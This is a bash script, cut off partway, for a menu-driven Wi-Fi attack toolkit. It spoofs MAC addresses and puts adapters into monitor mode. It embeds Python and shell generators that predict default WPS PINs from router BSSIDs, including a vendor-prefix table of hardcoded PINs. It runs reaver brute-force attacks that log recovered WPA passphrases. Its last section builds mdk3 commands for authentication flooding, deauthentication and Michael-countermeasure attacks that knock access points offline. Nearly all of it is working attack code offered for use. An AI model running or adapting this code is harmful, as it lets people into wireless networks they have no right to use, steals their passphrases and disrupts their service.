###################################################################################################################
##                               Written by Curtis Le Gendre AKA Anakin Skywalker                                ##
##                                                                                                               ##
###################################################################################################################

#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

while :
do

###### Create/wifi storage folder if it doeasn't exist ######

if [ -d $opt/wifi ];
then
   echo ""
else
   mkdir $opt/wifi
   mkdir $opt/wifi/temp
   mkdir $opt/wifi/Captured_Handshakes
   mkdir $opt/wifi/Client_Scans
fi

###### Delete Missed Files In The Temp Directory ######

   rm $opt/wifi/temp/*.txt &> /dev/null
   rm $opt/wifi/temp/*.py &> /dev/null
   rm $opt/wifi/temp/*.ivs &> /dev/null
   rm $opt/wifi/temp/*.cap &> /dev/null
   rm $opt/wifi/temp/*.xor &> /dev/null
   rm $opt/wifi/temp/*.csv &> /dev/null
   rm $opt/wifi/temp/*.netxml &> /dev/null
   rm $opt/wifi/temp/arp-packet &> /dev/null
   rm $opt/wifi/temp/*.sh &> /dev/null

###### START OF: DETECT mon0 MAC ADDRESS AND THEN DISPLAY SYSTEM MODE STATUS ######

mon0mac=$(ip addr | grep "radiotap" | cut -c 30-46)

if [ -s $mon0mac ]
then
   MonitorModeStatus=$(echo Networking Mode Enabled)
else
   MonitorModeStatus=$(echo Attack Mode Enabled)
fi

###### System Environment Options Menu ######
clear
echo $RED"#########################################"
echo "#   $STAND         /wifi             $RED#"
echo "#########################################"
echo "#                                       #"
echo "#$GREEN [1]$BLUE WiFi Adapter Selection            $RED#"
echo "#$GREEN [2]$BLUE Enable Attack Or Networking Mode  $RED#"
echo "#$GREEN [3]$BLUE Attack A WPS Enabled Access Point $RED#"
echo "#$GREEN [4]$BLUE Capture WPA/WPA2 Handshake        $RED#"
echo "#$GREEN [5]$BLUE WEP Attacks                       $RED#"
echo "#$GREEN [6]$BLUE Attack Handshake.cap Files        $RED#"
echo "#$GREEN [7]$BLUE Show Recovered Passkeys           $RED#"
echo "#$GREEN [8]$BLUE Recovered Passkey Checker         $RED#"
echo "#                                       #"
echo "#########################################"
echo ""
echo "Chosen Interface$STAND: $wlanX"
echo $RED"System Mode$STAND: $MonitorModeStatus"
echo $RED"MAC address for mon0$STAND: $mon0mac"
echo ""
read -s -n1 -p $GREEN"Please choose an option?$STAND: " ChosenOption
echo 
case $ChosenOption in

1)
###### [1] START OF: CHOOSE A WIFI ADAPTER ######

cd $opt/wifi/temp
clear
Presented_WiFi_Adapters=$(airmon-ng | grep "wlan" | cut -c 1-5 | nl -ba -w 1  -s ": ")
clear
echo $RED"Available WiFi Adapters.$STAND"
echo ""
echo "$Presented_WiFi_Adapters"
echo ""
read -s -n1 -p $GREEN"Please input the number of your chosen WiFi adapter:$STAND " grep_Line_Number
wlanX=$(echo $Presented_WiFi_Adapters | sed -n ""$grep_Line_Number"p" | cut -c 4-8)
echo ""
echo ""
echo $RED"You've chosen:$STAND $wlanX"
sleep 1
cd

;;

###### [1] END OF: CHOOSE A WIFI ADAPTER ######

2)
###### [2] START OF: ENABLE NETWORKING OR ATTACK MODE ######

clear
echo $RED"#########################################"
echo "#                                       #"
echo "# $GREEN[1]$BLUE Enable Networking Mode           $RED #"
echo "# $GREEN[2]$BLUE Enable Attack Mode               $RED #"
echo "# $GREEN[0]$BLUE Return To Main Menu              $RED #"
echo "#                                       #"
echo "#########################################$STAND"
echo ""
read -s -n1 -p $GREEN"Choose an option, 1 or 2?:$STAND " option
if [[ $option == "1" ]]; then
   clear
   echo $RED"Putting the system into networking mode$STAND"
   airmon-ng stop mon5 > /dev/null
   airmon-ng stop mon4 > /dev/null
   airmon-ng stop mon3 > /dev/null
   airmon-ng stop mon2 > /dev/null
   airmon-ng stop mon1 > /dev/null
   airmon-ng stop mon0 > /dev/null
   airmon-ng stop wlanX 
   echo $RED"Please wait...$STAND"
   ifconfig $wlanX down
   ifconfig $wlanX down
   wlanFakeMAC=$(macchanger -r $wlanX | grep "New" | cut -c 16-32)
   ifconfig $wlanX hw ether $wlanFakeMAC
   ifconfig $wlanX up
   sleep 1
   service network-manager start
   echo ""
   echo $RED"Networking mode should now be enabled, A fake MAC address has also been set.$STAND"
   sleep 3
   fi

if [[ $option == "2" ]]; then
   clear
   echo $RED"Putting the system into attack mode$STAND"
   echo $RED"Please wait...$STAND"
   echo ""
   airmon-ng stop mon5 > /dev/null
   airmon-ng stop mon4 > /dev/null
   airmon-ng stop mon3 > /dev/null
   airmon-ng stop mon2 > /dev/null
   airmon-ng stop mon1 > /dev/null
   airmon-ng stop mon0 > /dev/null
   ifconfig $wlanX down

read -s -n1 -p $GREEN"Would you like to disable processes that might cause issue's Y/n?.$STAND " KillProcesses
if [[ $KillProcesses == "Y" || $KillProcesses == "y" ]]; then
   echo ""
   echo $RED"Please wait...$STAND"
   kill `pidof NetworkManager`
   sleep 2
   kill `pidof wpa_supplicant`
   sleep 2                 
fi

   ifconfig $wlanX up
   sleep 1
   airmon-ng start $wlanX
   echo $RED"Please wait...$STAND"
   sleep 1
   ifconfig $wlanX down
   sleep 1
   ifconfig mon0 down
   wlanMAC1=$(macchanger -r $wlanX | grep "New" | cut -c 16-32)
   ifconfig $wlanX hw ether $wlanMAC1
   echo ""
   sleep 1
   macchanger --mac $wlanMAC1 mon0 > /dev/null
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for $wlanX:$STAND"
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for mon0:$STAND"
   macchanger -s mon0
   echo ""
   echo $RED"A Random MAC address has been set,$STAND "$wlanX"$RED and$STAND mon0$RED should now have the same fake MAC address.$STAND"
   echo ""
   echo $RED"Attack Mode Should Now Be Enabled.$STAND"
   sleep 3
fi

;;

###### [2] END OF: ENABLE NETWORKING OR ATTACK MODE ######

3)
###### [3] Attack A WPS Enabled Access Point ######
cd $opt/wifi/temp
clear
############## Start Of Create WPSpin.py And easybox_wps.py ##############

############## WPSpin.py ##############
echo '
import sys
 
VERSION    = 1
SUBVERSION = 0
 
def usage():
    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
    print "[*] Usage : python WPSpin.py 123456"
    sys.exit(0)
 
def wps_pin_checksum(pin):
    accum = 0
 
    while(pin):
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return  (10 - accum % 10) % 10
 
try:
    if (len(sys.argv[1]) == 6):
        p = int(sys.argv[1] , 16) % 10000000
        print "[+] WPS pin might be : %07d%d" % (p, wps_pin_checksum(p))
    else:
        usage()
except Exception:
    usage()
' > WPSpin.py

############## easybox_wps.py ##############

echo '#!/usr/bin/env python
import sys, re

def gen_pin (mac_str, sn):
    mac_int = [int(x, 16) for x in mac_str]
    sn_int = [0]*5+[int(x) for x in sn[5:]]
    hpin = [0] * 7
    
    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9];
    hpin[1] = k1 ^ sn_int[8];
    hpin[2] = k2 ^ mac_int[9];
    hpin[3] = k2 ^ mac_int[10];
    hpin[4] = mac_int[10] ^ sn_int[9];
    hpin[5] = mac_int[11] ^ sn_int[8];
    hpin[6] = k1 ^ sn_int[7];
    pin = int("%1X%1X%1X%1X%1X%1X%1X" % (hpin[0], hpin[1], hpin[2], hpin[3], hpin[4], hpin[5], hpin[6]), 16) % 10000000

    # WPS PIN Checksum - for more information see hostapd/wpa_supplicant source (wps_pin_checksum) or
	# http://download.microsoft.com/download/a/f/7/af7777e5-7dcd-4800-8a0a-b18336565f5b/WCN-Netspec.doc    
    accum = 0
    t = pin
    while (t):
        accum += 3 * (t % 10)
        t /= 10
        accum += t % 10
        t /= 10
    return "%i%i" % (pin, (10 - accum % 10) % 10)

def main():
    if len(sys.argv) != 2:
        sys.exit("usage: easybox_wps.py [BSSID]\n eg. easybox_wps.py 38:22:9D:11:22:33\n")
        
    mac_str = re.sub(r"[^a-fA-F0-9]", "", sys.argv[1])
    if len(mac_str) != 12:
        sys.exit("check MAC format!\n")
        
    sn = "R----%05i" % int(mac_str[8:12], 16)
    print "derived serial number:", sn
    print "SSID: Arcor|EasyBox|Vodafone-%c%c%c%c%c%c" % (mac_str[6], mac_str[7], mac_str[8], mac_str[9], sn[5], sn[9])        
    print "WPS pin:", gen_pin(mac_str, sn)

if __name__ == "__main__":
    main()
' > easybox_wps.py

############## End Of Create WPSpin.py And easybox_wps.py ##############

############## Start Of Target Selection And Pin Generation ##############

clear
echo $RED"Scanning for WPS-enabled access points, press Ctrl+c on the wash screen to stop the scan and choose a target."$STAND
read -p $GREEN"Press [Enter] to launch the scan.$STAND"
xterm -geometry 111x24+650+0 -l -lf WashScan.txt -e wash -i mon0
sed -i ''1,6d';'$d'' WashScan.txt

############## Start Of Loop Section ##############

while true
do

Presented_APs=$(cat WashScan.txt | awk '{ print $6 }' | nl -ba -w 1  -s ': ' | sed '$d')
clear
echo $RED"Available Access Points."$STAND
echo ""
echo "$Presented_APs"
echo ""
read -p $GREEN"Please input the number of your chosen target:$STAND " grep_AP_line_number

Chosen_AP_Line=$(cat WashScan.txt | sed -n ""$grep_AP_line_number"p")
AP_essid=$(echo $Chosen_AP_Line | awk '{ print $6 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
AP_bssid=$(echo $Chosen_AP_Line | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
AP_channel=$(echo $Chosen_AP_Line | awk '{ print $2 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
PinMAC1=$(echo $AP_bssid | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $AP_bssid | sed 's/://g' | cut -c 1-6)
WPSpin1=`python WPSpin.py $PinMAC1 | awk '{ print $7 }'`
WPSpin2=`python WPSpin.py $PinMAC2 | awk '{ print $7 }'`
easybox=`python easybox_wps.py $AP_bssid | grep "WPS pin" | cut -c 10-17`

############## End Of Target Selection And Pin Generation ##############

############## Start Of Choose A MAC Address Options ##############

clear
echo $RED"Please choose a MAC address option:$STAND"
echo $GREEN"[1]$BLUE = Auto Set A Random MAC address.$STAND"
echo $GREEN"[2]$BLUE = Input Any MAC Address You Want To Use.$STAND"
echo $GREEN"[3]$BLUE = Continue Without Changing The MAC Address.$STAND"
read -s -n1 -p $GREEN"Please choose 1, 2, or 3?$STAND: " option

if [[ $option == "1" ]]; then
   clear
   echo $RED"Auto Setting A Random MAC Address.$STAND"
   echo $RED"Please wait..."$STAND
   ifconfig $wlanX down
   ifconfig $wlanX down
   sleep 1
   ifconfig mon0 down
   wlanMAC2=`macchanger -r $wlanX | grep "New" | cut -c 16-32`
   ifconfig $wlanX hw ether $wlanMAC2
   echo ""
   sleep 1
   macchanger --mac $wlanMAC2 mon0
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND mon0:"
   macchanger -s mon0
   echo ""
   echo $RED"A Random MAC address has been set,$STAND $wlanX$RED and$STAND mon0$RED should now have the same fake MAC address."
   echo ""
   sleep 4
   fi

if [[ $option == "2" ]]; then
   clear
   echo $RED"Set A User specified MAC Address.$STAND"
   echo $RED"Please wait..."$STAND
   ifconfig $wlanX down
   ifconfig mon0 down
   echo ""
   echo $RED"Setting a random MAC address."$STAND
   macchanger -r $wlanX
   echo ""
   read -p $GREEN"Input any mac address you want to use?.$STAND " SpecifiedInterfaceMAC
   ifconfig $wlanX hw ether $SpecifiedInterfaceMAC
   macchanger --mac $SpecifiedInterfaceMAC mon0
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"$STAND
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND mon0:"$STAND
   macchanger -s mon0
   echo ""
   sleep 2
   echo $RED"A User specified MAC Address has been set, $wlanX and $monX should now have the same fake MAC address."$STAND
   echo ""
   echo $RED"Attack Mode Should Now Be Enabled."$STAND
   sleep 2
   fi

if [[ $option == "3" ]]; then
   echo ""
fi

############## End Of Choose A MAC Address Options ##############

############## Start Of Review Information ##############

clear
echo $RED"Review Information."$STAND
echo ""
echo $RED"You've chosen$BLUE essid$RED:$STAND $AP_essid"
echo $RED"You've chosen$BLUE bssid$RED:$STAND $AP_bssid"
echo $RED"You've chosen$BLUE Channel$RED:$STAND $AP_channel"
echo ""
echo $RED"Possible$BLUE WPS Pin1$RED:$STAND $WPSpin1"
echo $RED"Possible$BLUE WPS Pin2$RED:$STAND $WPSpin2"
echo $RED"Possible$BLUE easybox Pin$RED:$STAND $easybox"
############## Start Of WPSPIN-1.3 Default Pin Generater ##############

ESSID=$(echo $AP_essid)
BSSID=$(echo $AP_bssid)

FUNC_CHECKSUM(){
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`

DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`

PIN=`expr $PIN '+' $CHECKSUM`
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1 ')' '%' 10 ')'`

RESTE=`expr $ACCUM '%' 10`
 }

CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')

FINBSSID=$(echo $BSSID | cut -d ':' -f4-)

MAC=$(echo $FINBSSID | tr -d ':')

CONVERTEDMAC=$(printf '%d\n' 0x$MAC)

FINESSID=$(echo $ESSID | cut -d '-' -f2)

PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')

CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')

MACESSID=$(echo $PAREMAC$FINESSID)

STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`

PIN=`expr 10 '*' $STRING`

FUNC_CHECKSUM

PINWPS1=$(printf '%08d\n' $PIN)

STRING2=`expr $STRING '+' 8`
PIN=`expr 10 '*' $STRING2`

FUNC_CHECKSUM

PINWPS2=$(printf '%08d\n' $PIN)

STRING3=`expr $STRING '+' 14`
PIN=`expr 10 '*' $STRING3`

FUNC_CHECKSUM

PINWPS3=$(printf '%08d\n' $PIN)

if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&  [[ "$CHECKBSSID" = "04C06F" || "$CHECKBSSID" = "202BC1" || "$CHECKBSSID" = "285FDB" || "$CHECKBSSID" = "80B686" || "$CHECKBSSID" = "84A8E4" || "$CHECKBSSID" = "B4749F" || "$CHECKBSSID" = "BC7670" || "$CHECKBSSID" = "CC96A0" ]] &&  [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];

then

CONVERTEDMACESSID=$(printf '%d\n' 0x$MACESSID)

RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`

STRING4=`expr $RAIZ '+' 7`

PIN=`expr 10 '*' $STRING4`

FUNC_CHECKSUM

PINWPS4=$(printf '%08d\n' $PIN)

echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS4  "
PIN4REAVER=$PINWPS4
else
case $CHECKBSSID in
04C06F | 202BC1 | 285FDB | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1  
$RED"Other Possible Pin"$RED:$STAND $PINWPS2  
$RED"Other Possible Pin"$RED:$STAND $PINWPS3"
PIN4REAVER=$PINWPS1
;;
001915)
echo -e "$RED"Other Possible Pin"$RED:$STAND 12345670"
PIN4REAVER=12345670
;;
404A03)
echo -e "$RED"Other Possible Pin"$RED:$STAND 11866428"
PIN4REAVER=11866428
;;
F43E61 | 001FA4)
echo -e "$RED"Other Possible Pin"$RED:$STAND 12345670"
PIN4REAVER=12345670
;;
001A2B)
if [[ $ESSID =~ ^WLAN_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$RED"Other Possible Pin"$RED:$STAND 88478760"
PIN4REAVER=88478760
else
echo -e "PIN POSSIBLE... > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
3872C0)
if [[ $ESSID =~ ^JAZZTEL_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$RED"Other Possible Pin"$RED:$STAND 18836486"
PIN4REAVER=18836486
else
echo -e "PIN POSSIBLE    > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
FCF528)
echo -e "$RED"Other Possible Pin"$RED:$STAND 20329761"
PIN4REAVER= 20329761
;;
3039F2)
echo -e "several possible PINs, ranked in order>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
A4526F)
echo -e "several possible PINs, ranked in order>  
 16538061 88202907 73767053 16702738 43297917 18355604 "
PIN4REAVER=16538061
;;
74888B)
echo -e "several possible PINs, ranked in order>  
 43297917 73767053 88202907 16538061 16702738 18355604"
PIN4REAVER=43297917
;;
DC0B1A)
echo -e "several possible PINs, ranked in order>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
5C4CA9 | 62A8E4 | 62C06F | 62C61F | 62E87B | 6A559C | 6AA8E4 | 6AC06F | 6AC714 | 6AD167 | 72A8E4 | 72C06F | 72C714 | 72E87B | 723DFF | 7253D4)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1 "
PIN4REAVER=$PINWPS1
;;
002275)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
08863B)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
001CDF)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
00A026)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
5057F0)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
C83A35 | 00B00C | 081075)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
E47CF9 | 801F02)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
0022F7)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
*)
echo -e $RED"Other Possible Pin$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
esac
fi

############## End Of WPSPIN-1.3 Default Pin Generater ##############

echo ""
echo $RED"MAC address for$STAND mon0:"$STAND
macchanger -s mon0
sleep 4

############## End Of Review Information ##############

############## Start Of Scan For Clients And Store Collected MAC Addresses Option ##############
echo ""
read -s -n1 -p $GREEN"Would you like to scan for clients connected to the target access point? Y/n:$STAND  " ClientScan

if [[ $ClientScan == "Y" || $ClientScan == "y" ]]; then
   xterm -geometry 111x24+650+0 -l -lf temp1.txt -e airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0
   cat temp1.txt | tail -10 | sed 'N;$!P;$!D;$d' | sed -n '/STATION/,$p' >> ClientScan-$AP_bssid.txt
   mv ClientScan-$AP_bssid.txt $opt/wifi/Client_Scans/ClientScan-$AP_bssid.txt
   rm temp1.txt
   echo ""
   echo ""
   echo $RED"Collected scan data is stored in$STAND ClientScan-$AP_bssid.txt $RED Location$STAND: $opt/wifi/Client_Scans"
   echo ""
   read -p $GREEN"Press [Enter] to continue.$STAND"
   fi

if [[ $ClientScan == "N" || $ClientScan == "n" ]]; then
   echo ""
   fi
############## End Of Scan For Clients And Store Collected MAC Addresses Option ##############

############## Start Of Reaver Attacks And Store Recovered Passkey ##############

clear
echo $RED"Choose an attack option:"$STAND
echo $GREEN"[1]$BLUE = Reaver + Auto Generated WPS Pin"$STAND
echo $GREEN"[2]$BLUE = Reaver (Customisable Options)"$STAND
echo
read -s -n1 -p $GREEN"Please choose an option?$STAND: " yourch
echo 
case $yourch in

1)
clear
echo $RED"Choose a pin:"
echo $GREEN"[1]$BLUE WPS Pin1 = $WPSpin1"
echo $GREEN"[2]$BLUE WPS Pin2 = $WPSpin2"
echo $GREEN"[3]$BLUE EasyBox Pin = $easybox"
echo $GREEN"[4]$BLUE Other Pins = $PIN4REAVER"
read -s -n1 -p $GREEN"Please choose 1, 2, 3, or 4?$STAND: " PinOption

if [[ $PinOption == "1" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin1 -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin1 -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi

if [[ $PinOption == "2" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin2 -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin2 -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi

if [[ $PinOption == "3" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $easybox -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $easybox -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi

if [[ $PinOption == "4" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $PIN4REAVER -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $PIN4REAVER -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi ;;

2)
clear
echo $RED"Current Reaver Attack Command:"$STAND
echo "reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions"
echo ""
read -p $GREEN"Please input any additional reaver options (eg: -vv):$STAND " ReaverOptions
echo ""
echo $RED"New Reaver Attack Command:"$STAND
echo "reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions"
echo ""
read -p $GREEN"Press [Enter] to launch the attack.$STAND"
reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
rm reaver.txt

################## START OF: MDK3 ACCESS POINT RESET ############################################

echo ""
echo ""
echo $GREEN"Would you like to try to reset the access point? Y/n"$STAND
read a
if [[ $a == "Y" || $a == "y" || $a = "" ]]; then

   echo "Press the [Enter] button 3 times on the kismet screen, wait 5-10 seconds then press Ctrl+c."
   kismet ncsource=mon0:hop=true
   sleep 5

   echo ""
   echo $RED"Target essid:$STAND $AP_essid"
   echo ""
   read -p $GREEN"Please input the above target essid.$STAND" MDK3_Target
   echo ""
   cat $opt/wifi/temp/*.nettxt | sed -n "/$MDK3_Target/,/Channel/p"

   echo 'AP_bssid="'"$AP_bssid"'"' > MDK3_APbssid.txt
   sleep 1
   echo 'AP_channel="'"$AP_channel"'"' > MDK3_APchannel.txt
   sleep 1
   cat MDK3_APbssid.txt | sed 's/AP_bssid=//' | sed 's/"//g' > MDK3_APbssid_1.txt
   sleep 1
   cat MDK3_APchannel.txt | sed 's/AP_channel=//' | sed 's/"//g' > MDK3_APchannel_1.txt
   sleep 1
   echo $AP_bssid > Blacklist.txt

   echo ""
   echo $GREEN"Does the access point support WAP+TKIP?"
   echo $GREEN"[1]$BLUE = Yes."
   echo $GREEN"[2]$BLUE = No."
   echo $GREEN"1 or 2?"$STAND
   read option

   if [[ $option == "1" ]]; then

      read -s -n1 -p $GREEN"Would you like to scan for clients connected to the target access point? Y/n:$STAND  " ClientScan

      if [[ $ClientScan == "Y" || $ClientScan == "y" ]]; then
         xterm -geometry 111x24+650+0 -e airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0
         echo ""
         echo ""
      fi

      echo $GREEN"Did the access point have any clients connected to it?"
      echo $GREEN"[1]$BLUE = Yes."
      echo $GREEN"[2]$BLUE = No."
      echo $GREEN"1 or 2?"$STAND
      read MDK3_ClientChoice

      if [[ $MDK3_ClientChoice == "1" ]]; then

         echo '#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)

AP_bssid=$(cat $opt/wifi/temp/MDK3_APbssid_1.txt)
sleep 1
AP_channel=$(cat $opt/wifi/temp/MDK3_APchannel_1.txt)
echo ""
echo $GREEN"Press Ctrl+c on this screen to terminate the MDK3 attack and continue.$STAND"

   xterm -geometry 100x10+675+0 -e "mdk3 mon0 a -a $AP_bssid -m" &
   xterm -geometry 100x10+675+185 -e "mdk3 mon0 d -b $opt/wifi/temp/Blacklist.txt -c $AP_channel" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 b -t $AP_bssid" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 m -t $AP_bssid -j" &

while :
do
